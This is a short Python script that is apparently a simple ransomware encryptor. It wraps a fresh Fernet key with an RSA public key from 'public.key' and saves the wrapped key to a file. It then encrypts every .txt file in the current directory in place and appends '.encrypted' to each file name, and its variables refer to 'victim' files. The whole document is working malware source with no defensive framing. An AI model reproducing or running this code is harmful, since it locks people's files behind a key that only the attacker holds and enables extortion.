from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet
import os

# reads the public key from a file
with open("public.key", "rb") as file:
    pub_key_unseralized = file.read()

# loads the serialized public key
public_key = serialization.load_pem_public_key(
    pub_key_unseralized, backend=default_backend()
)

# generates a shared key, which is going to be used later to decrypt the files
shared_key = Fernet.generate_key()
fernet = Fernet(shared_key)

# encrypts the shared key, which will be sent in the transmission of the message
encrypted_shared_key = public_key.encrypt(
    shared_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)

with open("EncryptedSharedKey", "wb") as file:
    file.write(encrypted_shared_key)

# where ever this program is located, it will encrypt the files with the proper extentions
directory = os.listdir()
print(directory)
for file in directory:
    if file.endswith(".txt"):
        with open(file, "rb") as victim_file:
            contents = victim_file.read()
            encrypted_contents = fernet.encrypt(contents)
        with open(file, "wb") as victim_file:
            victim_file.write(encrypted_contents)
        name, ext = os.path.splitext(file)
        os.rename(file, file + ".encrypted")
